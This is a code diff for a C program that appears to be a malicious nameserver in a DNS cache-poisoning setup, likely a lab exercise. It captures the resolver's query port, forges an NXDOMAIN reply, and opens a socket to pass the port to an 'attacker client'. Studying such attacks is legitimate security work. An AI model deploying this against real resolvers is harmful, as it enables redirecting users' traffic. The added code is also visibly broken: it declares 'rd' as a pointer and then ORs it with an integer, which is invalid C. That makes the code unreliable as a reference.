@@ -43,7 +43,20 @@ int main(void) {
     printf("[NS] Got DNS query from resolver port: %d\n", resolver_port);
     // here we got the Port number
 
+    unsigned char *dns = (unsigned char*) buf;
+    unsigned char* rd = dns[2] & 0x01;
+    dns[2] = 0x80 |rd;
+    dns[3] = 0x03;
+    dns[6] = dns[7] = 0;
+    dns[8] = dns[9] = 0;
+    dns[10] = dns[11] = 0;
 
+    if (sendto(udp_sockfd, buf, n, 0, (struct sockaddr*)&resolver_addr, resolver_len) < 0) {
+        printf("sendto failed");
+    }
+    else {
+        printf("[NS] Sent NXDOMAIN response to resolver\n");
+    }
 
     // this is the socket in which we use to send the port to the attacker client
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
